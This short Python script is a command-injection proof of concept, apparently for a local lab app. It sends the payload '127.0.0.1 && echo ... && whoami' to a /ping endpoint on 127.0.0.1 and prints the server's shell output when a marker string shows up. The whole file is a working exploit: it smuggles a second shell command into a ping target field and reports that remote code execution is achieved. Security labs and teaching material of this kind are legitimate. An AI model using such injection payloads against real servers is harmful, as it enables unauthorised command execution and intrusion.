import requests

TARGET_URL = "http://127.0.0.1:5055/ping"

# The Payload:
# 1. '127.0.0.1' fulfills the app's expected input.
# 2. '&&' tells the OS to run a second command.
# 3. 'echo [!!!] SYSTEM_COMPROMISED [!!!]' is our proof of concept.
# 4. 'whoami' asks the server to reveal the username it is running under.
PAYLOAD = "127.0.0.1 && echo [!!!] SYSTEM_COMPROMISED_BY_MEGHNAD [!!!] && whoami"

print(f"[*] Injecting RCE payload: {PAYLOAD}")
r = requests.get(TARGET_URL, params={'target': PAYLOAD})

if "SYSTEM_COMPROMISED" in r.text:
    print("\n[+] CRITICAL SUCCESS: Remote Code Execution (RCE) Achieved!")
    print("-" * 50)
    
    # Clean up the HTML tags to just show the server's raw terminal output
    output = r.text.split('<pre>')[1].split('</pre>')[0].strip()
    print(output)
    print("-" * 50)
else:
    print("\n[-] Attack failed. The server might be sanitizing the input.")